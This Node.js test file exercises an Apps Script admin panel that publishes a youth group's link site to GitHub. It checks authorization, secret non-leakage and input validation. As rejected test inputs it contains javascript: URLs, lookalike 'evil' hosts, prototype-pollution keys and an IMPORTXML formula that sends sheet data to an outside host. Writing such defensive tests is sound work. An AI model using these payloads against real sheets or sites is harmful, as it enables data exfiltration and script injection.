// End-to-end tests of the Apps Script admin (Auth, Store, Code, Publish)
// running against in-memory Apps Script services and a fake GitHub.

import test from 'node:test';
import assert from 'node:assert/strict';
import { createWorld, FakeGitHub } from './fakes/gas.mjs';

const ADMIN = 'menazakmena@gmail.com';
const STRANGER = 'someone@gmail.com';

const plain = value => JSON.parse(JSON.stringify(value));

function configuredWorld(options = {}) {
  const world = createWorld(options);
  world.as(ADMIN).gs.setup();
  world.properties.set('GITHUB_TOKEN', 'test-token');
  world.properties.set('GITHUB_REPO', 'StAthanasiosYouth/StAthanasiosYouth.github.io');
  world.properties.set('SITE_URL', 'https://stathanasiosyouth.github.io/');
  return world;
}

const stateOf = world => plain(world.as(ADMIN).gs.apiState());


/* ---------------- setup + authorization ---------------- */

test('setup: no automatic admin; without ADMIN_EMAILS nobody gets in', () => {
  const world = createWorld({ adminEmails: '' });
  assert.throws(() => world.as(ADMIN).gs.setup(), /مش مسموح/);
  assert.throws(() => world.as(STRANGER).gs.setup(), /مش مسموح/);
  assert.equal(world.properties.get('ADMIN_EMAILS'), undefined);
  assert.equal(world.spreadsheet, null, 'no sheet created');
});

test('setup by the admin creates the private Sheet and its tabs', () => {
  const world = createWorld();
  world.as(ADMIN).gs.setup();
  assert.equal(world.spreadsheet.owner, ADMIN);
  assert.equal(world.properties.get('SHEET_ID'), 'sheet-id-123');
  const names = world.spreadsheet.getSheets().map(s => s.name);
  assert.deepEqual(names, ['Settings', 'Sections', 'Links', 'Contacts', 'Sessions', 'News', 'Games', 'Notifications', 'Media', 'Log']);
  assert.equal(world.spreadsheet.getSheetByName('Links').getLastRow(), 5, 'header + 4 seed links');
  // running again keeps data
  world.gs.setup();
  assert.equal(world.spreadsheet.getSheetByName('Links').getLastRow(), 5);
});

test('every browser-callable data function rejects non-admins', () => {
  const world = configuredWorld().as(STRANGER);
  const calls = {
    apiState: [], apiReview: [], apiPublish: ['x'], apiCheckGithub: [],
    apiSaveLink: [{ title: 'x', url: 'https://a.com', section: 'social' }], apiSetLinkEnabled: ['facebook', false],
    apiDeleteLink: ['facebook'], apiMoveLink: ['facebook', 1], apiSaveSection: [{ key: 'x', title: 'x' }, true],
    apiDeleteSection: ['links'], apiMoveSection: ['social', 1], apiSaveContact: [{ name: 'x', phone: '01012345678', method: 'call' }],
    apiDeleteContact: ['tech-support'], apiMoveContact: ['tech-support', -1], apiSaveSettings: [{ 'site.tagline': 'x' }],
    apiResolveMapsUrl: ['https://maps.app.goo.gl/x'], setup: []
  };
  for (const [name, args] of Object.entries(calls)) {
    assert.throws(() => world.gs[name](...args), /مش مسموح/, name);
  }
  // nothing changed
  world.as(ADMIN);
  assert.equal(stateOf(world).draft.links.length, 4);
});

test('no unguarded public function slipped in', () => {
  // public = callable from the browser through google.script.run
  const world = configuredWorld();
  const pure = new Set(['buildPublicContent', 'safeHttpsUrl', 'normalizePhone', 'contentRevision', 'buildMeetingIcs', 'summarizeChanges', 'seedDraft', 'doGet']);
  const publicFns = Object.keys(world.gs).filter(k => typeof world.gs[k] === 'function' && !k.endsWith('_'));
  const unexpected = publicFns.filter(k => !pure.has(k) && !/^api/.test(k) && k !== 'setup');
  assert.deepEqual(unexpected, []);
});

test('doGet: admin gets the panel, others the no-access page; framing is denied', () => {
  const world = configuredWorld();
  const admin = world.as(ADMIN).gs.doGet();
  assert.equal(admin.template, 'Admin');
  assert.equal(admin.xframe, 'DEFAULT');
  const other = world.as(STRANGER).gs.doGet();
  assert.equal(other.template, 'NoAccess');
  assert.equal(other.data.email, STRANGER);
});

test('allowlist comes from Script Properties, comma separated, case-insensitive', () => {
  const world = configuredWorld();
  world.properties.set('ADMIN_EMAILS', ' MenaZakMena@gmail.com , second@gmail.com');
  assert.doesNotThrow(() => world.as(ADMIN).gs.apiState());
  assert.doesNotThrow(() => world.as('second@gmail.com').gs.apiState());
  world.properties.set('ADMIN_EMAILS', '');
  assert.throws(() => world.as(ADMIN).gs.apiState(), /مش مسموح/, 'fails closed');
});


/* ---------------- editing ---------------- */

test('state: seed draft, unpublished, no errors', () => {
  const state = stateOf(configuredWorld());
  assert.equal(state.user, ADMIN);
  assert.deepEqual(state.draft.links.map(l => l.id), ['your-voice-matters', 'facebook', 'instagram', 'tiktok']);
  assert.equal(state.status.hasChanges, true);
  assert.deepEqual(state.status.errors, []);
  assert.equal(state.config.tokenSet, true);
  assert.ok(!JSON.stringify(state).includes('test-token'), 'token never sent to the page');
});

test('links: validation, add, move, toggle, delete', () => {
  const world = configuredWorld();
  const gs = world.as(ADMIN).gs;

  assert.throws(() => gs.apiSaveLink({ title: 'x', url: 'javascript:alert(1)', section: 'links' }), /https/);
  assert.throws(() => gs.apiSaveLink({ title: '', url: 'https://a.com', section: 'links' }), /العنوان مطلوب/);
  assert.throws(() => gs.apiSaveLink({ title: 'x', url: 'https://a.com', section: 'nope' }), /قسم/);
  assert.throws(() => gs.apiSaveLink({ title: 'x', url: 'https://a.com', section: 'links', startAt: '2026-13-40' }), /البداية/);

  let state = plain(gs.apiSaveLink({ title: 'رحلة الغردقة', subtitle: 'سجّل اسمك', url: 'https://forms.gle/abc', section: 'links', style: 'card', icon: 'bus', badge: 'جديد', startAt: '2026-10-06', endAt: '2026-10-20 22:00' }));
  const trip = state.draft.links.find(l => l.title === 'رحلة الغردقة');
  assert.match(trip.id, /^link-[0-9a-f]{8}$/);
  assert.equal(trip.endAt, '2026-10-20 22:00');
  assert.equal(trip.order, 10);

  // reorder social: instagram up -> instagram, facebook, tiktok
  state = plain(gs.apiMoveLink('instagram', -1));
  const social = state.draft.links.filter(l => l.section === 'social').sort((a, b) => a.order - b.order).map(l => l.id);
  assert.deepEqual(social, ['instagram', 'facebook', 'tiktok']);

  // edit keeps id and order
  state = plain(gs.apiSaveLink({ ...trip, title: 'رحلة الغردقة ٢٠٢٦', enabled: true }));
  assert.equal(state.draft.links.find(l => l.id === trip.id).title, 'رحلة الغردقة ٢٠٢٦');

  state = plain(gs.apiSetLinkEnabled('tiktok', false));
  assert.equal(state.draft.links.find(l => l.id === 'tiktok').enabled, false);

  state = plain(gs.apiDeleteLink(trip.id));
  assert.ok(!state.draft.links.some(l => l.id === trip.id));

  // every change is logged with who did it
  const log = world.spreadsheet.getSheetByName('Log').data.slice(1);
  assert.ok(log.length >= 5);
  assert.ok(log.every(row => row[1] === ADMIN));
});

test('sections: add, guard against deleting a used section, reorder', () => {
  const gs = configuredWorld().as(ADMIN).gs;
  assert.throws(() => gs.apiSaveSection({ key: 'Bad Key', title: 'x' }, true), /مفتاح/);
  let state = plain(gs.apiSaveSection({ key: 'events', title: 'مناسبات', enabled: true }, true));
  assert.ok(state.draft.sections.some(s => s.key === 'events'));
  assert.throws(() => gs.apiSaveSection({ key: 'events', title: 'x' }, true), /نفس المفتاح/);
  assert.throws(() => gs.apiDeleteSection('social'), /فيه روابط/);
  state = plain(gs.apiMoveSection('events', -1));
  const order = state.draft.sections.sort((a, b) => a.order - b.order).map(s => s.key);
  assert.deepEqual(order, ['social', 'events', 'links']);
  state = plain(gs.apiDeleteSection('events'));
  assert.ok(!state.draft.sections.some(s => s.key === 'events'));
});

test('contacts: phone validation and normalization', () => {
  const gs = configuredWorld().as(ADMIN).gs;
  assert.throws(() => gs.apiSaveContact({ name: 'x', phone: '123', method: 'call' }), /رقم التليفون/);
  assert.throws(() => gs.apiSaveContact({ name: 'x', phone: '01012345678' }), /طريقة التواصل/);
  const state = plain(gs.apiSaveContact({ name: 'مارك', role: 'خادم', phone: '+20 10 1234 5678', method: 'whatsapp', kind: 'service', message: 'أهلاً' }));
  const mark = state.draft.contacts.find(c => c.name === 'مارك');
  assert.equal(mark.phone, '01012345678');
  assert.equal(mark.method, 'whatsapp');
});

test('settings: normalization and validation', () => {
  const gs = configuredWorld().as(ADMIN).gs;
  let state = plain(gs.apiSaveSettings({ 'meeting.time': '7:30 pm', 'meeting.day': 'الجمعة', 'meeting.durationMinutes': '120', 'location.lat': '26.5', 'location.lng': '33.9' }));
  const get = key => state.draft.settings.find(s => s.key === key).value;
  assert.equal(get('meeting.time'), '19:30');
  assert.equal(get('meeting.day'), 'الجمعة');
  assert.equal(get('meeting.durationMinutes'), '120');
  assert.throws(() => gs.apiSaveSettings({ 'meeting.durationMinutes': '5' }), /مدة/);
  assert.throws(() => gs.apiSaveSettings({ 'location.mapsUrl': 'http://maps.google.com' }), /https/);
  assert.throws(() => gs.apiSaveSettings({ 'evil.key': 'x' }), /مش معروف/);
  assert.throws(() => gs.apiSaveSettings({ 'site.name': '' }), /اسم الخدمة/);
  state = plain(gs.apiSaveSettings({ 'meeting.durationMinutes': '' }));
  assert.equal(get('meeting.durationMinutes'), '');
});

test('maps link: coordinates from a short link; other hosts refused', () => {
  const world = configuredWorld({
    mapsRedirects: {
      'https://maps.app.goo.gl/eCUtm5AftfTzSXmV7': 'https://www.google.com/maps/place/Church/@26.731648,33.9376891,408m/data=!3m1!1e3!4m6!3m5!1s0x1:0x2!8m2!3d26.7314392!4d33.9379229'
    }
  });
  const coords = plain(world.as(ADMIN).gs.apiResolveMapsUrl('https://maps.app.goo.gl/eCUtm5AftfTzSXmV7'));
  assert.deepEqual(coords, { lat: 26.7314392, lng: 33.9379229 });
  for (const bad of ['https://evil.example.com/maps', 'https://maps.app.goo.gl.evil.com/x', 'https://google.com.evil.io/maps', 'https://goo.gl/notmaps', 'http://maps.app.goo.gl/x']) {
    assert.throws(() => world.gs.apiResolveMapsUrl(bad), /جوجل ماب/, bad);
  }
  assert.equal(world.gs.isGoogleMapsUrl_('https://www.google.com/maps/place/x'), true);
});


/* ---------------- publishing ---------------- */

test('publish: review, revision guard, one commit with both files, clean JSON', () => {
  const world = configuredWorld();
  const gs = world.as(ADMIN).gs;

  const review = plain(gs.apiReview());
  assert.deepEqual(review.changes, ['أول نشر للموقع']);
  assert.deepEqual(review.errors, []);

  assert.throws(() => gs.apiPublish('stale-revision'), /اتغيرت/);

  const headBefore = world.github.head;
  const result = plain(gs.apiPublish(review.revision));
  assert.equal(result.revision, review.revision);
  assert.ok(result.commitUrl.startsWith('https://github.com/StAthanasiosYouth/StAthanasiosYouth.github.io/commit/'));
  assert.equal(world.github.commits.get(world.github.head).parents[0], headBefore, 'single fast-forward commit');

  const files = world.github.files();
  const content = JSON.parse(files['content.json']);
  assert.equal(content.revision, review.revision);
  assert.ok(content.publishedAt);
  assert.match(files['meeting.ics'], /BEGIN:VCALENDAR/);

  const json = files['content.json'];
  for (const secret of [ADMIN, 'test-token', 'sheet-id-123', 'updatedAt', '"enabled"', 'docs.google.com']) {
    assert.ok(!json.includes(secret), `content.json leaks ${secret}`);
  }
  assert.ok(!world.github.commits.get(world.github.head).message.includes('@'), 'no email in commit message');

  assert.equal(result.state.status.hasChanges, false);
  assert.equal(world.properties.get('PUBLISHED_REVISION'), review.revision);
});

test('publish: drafts stay drafts until published; review lists the change', () => {
  const world = configuredWorld();
  const gs = world.as(ADMIN).gs;
  gs.apiPublish(plain(gs.apiReview()).revision);
  const published = world.github.files()['content.json'];

  const state = plain(gs.apiSaveSettings({ 'meeting.time': '19:00' }));
  assert.equal(state.status.hasChanges, true);
  assert.equal(world.github.files()['content.json'], published, 'saving does not touch GitHub');

  const review = plain(gs.apiReview());
  assert.deepEqual(review.changes, ['تعديل في معاد الاجتماع']);
  gs.apiPublish(review.revision);
  assert.equal(JSON.parse(world.github.files()['content.json']).meeting.time, '19:00');
});

test('publish: blocked by validation errors (e.g. a bad URL typed into the Sheet by hand)', () => {
  const world = configuredWorld();
  const links = world.spreadsheet.getSheetByName('Links');
  const urlCol = links.data[0].indexOf('url') + 1;
  links.set(3, urlCol, 'javascript:alert(1)');
  const gs = world.as(ADMIN).gs;
  const review = plain(gs.apiReview());
  assert.equal(review.errors.length, 1);
  assert.throws(() => gs.apiPublish(review.revision), /أخطاء/);
});

test('publish: unchanged content makes no commit', () => {
  const world = configuredWorld();
  const gs = world.as(ADMIN).gs;
  gs.apiPublish(plain(gs.apiReview()).revision);
  const head = world.github.head;
  const again = plain(gs.apiPublish(plain(gs.apiReview()).revision));
  assert.equal(again.unchanged, true);
  assert.equal(world.github.head, head, 'no new commit');
  assert.equal(again.state.status.hasChanges, false);
});

test('publish: someone pushed meanwhile -> rebuilt on the new head, nothing lost', () => {
  const world = configuredWorld();
  const gs = world.as(ADMIN).gs;
  world.github.beforeRefUpdate = () => world.github.pushOther('index.html', '<!-- code change -->');
  gs.apiPublish(plain(gs.apiReview()).revision);
  const files = world.github.files();
  assert.equal(files['index.html'], '<!-- code change -->');
  assert.ok(files['content.json']);
});

test('publish: missing or bad token gives a clear message without leaking it', () => {
  const world = configuredWorld();
  const gs = world.as(ADMIN).gs;
  const revision = plain(gs.apiReview()).revision;
  world.properties.delete('GITHUB_TOKEN');
  assert.throws(() => gs.apiPublish(revision), /GITHUB_TOKEN/);
  world.properties.set('GITHUB_TOKEN', 'wrong-secret-token');
  try {
    gs.apiPublish(revision);
    assert.fail('should throw');
  }
  catch (error) {
    assert.match(error.message, /401/);
    assert.ok(!error.message.includes('wrong-secret-token'));
  }
  const review = plain(gs.apiReview());
  assert.match(review.githubError, /401/);
});

test('check GitHub connection', () => {
  const result = plain(configuredWorld().as(ADMIN).gs.apiCheckGithub());
  assert.equal(result.repo, 'StAthanasiosYouth/StAthanasiosYouth.github.io');
  assert.equal(result.canPush, true);
});

test('repo already holding the seed content.json: review compares against it', () => {
  const seed = createWorld();
  seed.as(ADMIN).gs.setup();
  const content = seed.gs.buildPublicContent(seed.gs.readDraft_(), { now: '2026-10-05T12:00', hash: seed.gs.sha256Hex_ });
  const world = configuredWorld({ github: new FakeGitHub({ files: { 'content.json': JSON.stringify(content.content) } }) });
  const review = plain(world.as(ADMIN).gs.apiReview());
  assert.deepEqual(review.changes, [], 'same content as the seed');
});


/* ---------------- regressions from the security review ---------------- */

test('publishing requires the reviewed revision', () => {
  const gs = configuredWorld().as(ADMIN).gs;
  assert.throws(() => gs.apiPublish(), /راجعتها/);
  assert.throws(() => gs.apiPublish(''), /راجعتها/);
});

test('non-admins are refused before any Sheet read or validation detail', () => {
  const world = configuredWorld();
  const reads = [];
  const sheet = world.spreadsheet.getSheetByName('Sections');
  const original = sheet.getDataRange.bind(sheet);
  sheet.getDataRange = () => { reads.push('Sections'); return original(); };
  assert.throws(() => world.as(STRANGER).gs.apiSaveLink({ title: '', url: 'x', section: 'nope' }), /مش مسموح/);
  assert.deepEqual(reads, []);
});

test('keys like constructor / __proto__ are harmless', () => {
  const world = configuredWorld();
  const gs = world.as(ADMIN).gs;
  assert.throws(() => gs.apiSaveSettings({ constructor: 'x' }), /مش معروف/);
  assert.throws(() => gs.apiSaveSettings({ toString: 'x' }), /مش معروف/);
  // a hand-typed Settings row and odd ids must not break the panel or publishing
  world.spreadsheet.getSheetByName('Settings').appendRow(['constructor', 'x', '']);
  world.spreadsheet.getSheetByName('Settings').appendRow(['__proto__', 'x', '']);
  const links = world.spreadsheet.getSheetByName('Links');
  links.set(3, 1, 'constructor');
  assert.doesNotThrow(() => JSON.stringify(gs.apiState()));
  const review = plain(gs.apiReview());
  assert.deepEqual(review.errors, []);
});

test('log never stores formulas', () => {
  const world = configuredWorld();
  const gs = world.as(ADMIN).gs;
  gs.apiSaveLink({ title: '=IMPORTXML("https://x/?"&B2,"//a")', url: 'https://a.com', section: 'links' });
  const log = world.spreadsheet.getSheetByName('Log').data;
  const details = log[log.length - 1][3];
  assert.ok(!String(details).startsWith('='), details);
  assert.equal(gs.plainCell_('-1+2'), "'-1+2");
  assert.equal(gs.plainCell_('2026'), '2026');
});

test('move/delete/toggle reject malformed ids before logging', () => {
  const world = configuredWorld();
  const gs = world.as(ADMIN).gs;
  const before = world.spreadsheet.getSheetByName('Log').data.length;
  assert.throws(() => gs.apiMoveSection('=HYPERLINK("x")', 1), /معرّف/);
  assert.throws(() => gs.apiDeleteLink({ toString: () => 'x' }), /معرّف/);
  assert.equal(world.spreadsheet.getSheetByName('Log').data.length, before);
});

test('commits use a fixed, non-personal identity', () => {
  const world = configuredWorld();
  const gs = world.as(ADMIN).gs;
  gs.apiPublish(plain(gs.apiReview()).revision);
  const request = world.github.requests.find(r => r.method === 'post' && r.url.endsWith('/git/commits'));
  const body = JSON.parse(request.payload);
  assert.equal(body.author.email, 'portal-admin@users.noreply.github.com');
  assert.equal(body.committer.email, 'portal-admin@users.noreply.github.com');
});
